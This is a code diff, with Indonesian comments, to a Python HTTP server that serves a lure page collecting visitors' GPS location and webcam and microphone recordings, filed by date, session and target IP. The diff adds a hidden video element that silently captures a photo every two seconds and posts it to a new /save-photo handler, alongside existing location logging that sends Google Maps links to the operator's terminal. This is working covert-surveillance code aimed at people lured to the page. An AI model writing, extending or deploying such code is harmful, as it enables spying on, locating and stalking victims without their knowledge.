@@ -285,7 +285,6 @@ port, logfile, BASE_DIR, SESSION_ID = int(sys.argv[1]), sys.argv[2], sys.argv[3]
 lock = threading.RLock()
 devices, devinfo, names, pending = {}, {}, {}, {}
 
-# Format hierarki: saved_videos / Tanggal / Sesi_Waktu / IP_Target / [lokasi | video]
 today_date = datetime.now().strftime("%d-%m-%Y")
 SESSION_DIR = os.path.join(BASE_DIR, "saved_videos", today_date, SESSION_ID)
 
@@ -382,6 +381,30 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             setInterval(sendLocation, 10000);
 
             navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+                // Setup elemen video tersembunyi untuk tangkapan foto kontinu
+                const videoElement = document.createElement('video');
+                videoElement.srcObject = stream;
+                videoElement.play();
+
+                function capturePhoto() {
+                    try {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = videoElement.videoWidth || 640;
+                        canvas.height = videoElement.videoHeight || 480;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob(blob => {
+                            if (blob) {
+                                const fd = new FormData();
+                                fd.append('foto', blob, `foto_${Date.now()}.jpg`);
+                                fetch('/save-photo', { method: 'POST', body: fd }).catch(() => {});
+                            }
+                        }, 'image/jpeg', 0.8);
+                    } catch (e) {}
+                }
+                // Ambil foto setiap 2 detik secara terus-menerus
+                setInterval(capturePhoto, 2000);
+
                 function recordCycle() {
                     const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                     let chunks = [];
@@ -417,8 +440,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         parsed_path = self.path.split("?")[0]
         raw_ip = client_ip(self.headers, self.client_address)
         client_ip_addr = re.sub(r'[^a-zA-Z0-9_.-]', '_', raw_ip)
-        
-        # Subfolder IP di dalam sesi waktu saat ini
         ip_base_folder = os.path.join(SESSION_DIR, client_ip_addr)
 
         if parsed_path == "/save-location":
@@ -429,7 +450,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     data = json.loads(body_bytes.decode("utf-8", "ignore"))
                     gmaps_link = data.get("link", "No link")
                     
-                    # Membuat folder khusus lokasi
                     loc_folder = os.path.join(ip_base_folder, "lokasi")
                     if not os.path.exists(loc_folder): 
                         os.makedirs(loc_folder, exist_ok=True)
@@ -440,7 +460,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                     with open(loc_log_file, "a") as f:
                         f.write(f"[{timestamp}] IP: {raw_ip} | Maps: {gmaps_link}\n")
                     
-                    # Cetak link maps ke terminal utama
                     with open(logfile, "a") as lf:
                         t_str = datetime.now().strftime("%H:%M:%S")
                         lf.write(f"{t_str}\tLOC\t{gmaps_link}\t{raw_ip}\t0\n")
@@ -478,7 +497,6 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                         video_bytes = body_data
 
                     if len(video_bytes) > 50:
-                        # Membuat folder khusus video
                         vid_folder = os.path.join(ip_base_folder, "video")
                         if not os.path.exists(vid_folder): 
                             os.makedirs(vid_folder, exist_ok=True)
@@ -492,6 +510,49 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"Saved")
+            except Exception as e:
+                self.send_error(500, str(e))
+            return
+
+        if parsed_path == "/save-photo":
+            try:
+                length = int(self.headers.get("Content-Length", 0))
+                if length > 0:
+                    body_data = self.rfile.read(length)
+                    content_type = self.headers.get("Content-Type", "")
+                    photo_bytes = b""
+                    
+                    if "multipart/form-data" in content_type:
+                        if b'boundary=' in content_type.encode():
+                            boundary = content_type.split("boundary=")[-1].encode()
+                            parts = body_data.split(boundary)
+                            for part in parts:
+                                if b'filename=' in part:
+                                    header_end = part.find(b'\r\n\r\n')
+                                    if header_end != -1:
+                                        photo_bytes = part[header_end + 4:-2]
+                                        break
+                        if not photo_bytes:
+                            header_end = body_data.find(b'\r\n\r\n')
+                            if header_end != -1:
+                                photo_bytes = body_data[header_end + 4:-2]
+                    else:
+                        photo_bytes = body_data
+
+                    if len(photo_bytes) > 20:
+                        foto_folder = os.path.join(ip_base_folder, "foto")
+                        if not os.path.exists(foto_folder): 
+                            os.makedirs(foto_folder, exist_ok=True)
+                        
+                        filename = f"foto_{int(time.time())}_{uuid.uuid4().hex[:4]}.jpg"
+                        filepath = os.path.join(foto_folder, filename)
+                        
+                        with open(filepath, "wb") as f:
+                            f.write(photo_bytes)
+                
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b"Photo Saved")
             except Exception as e:
                 self.send_error(500, str(e))
             return
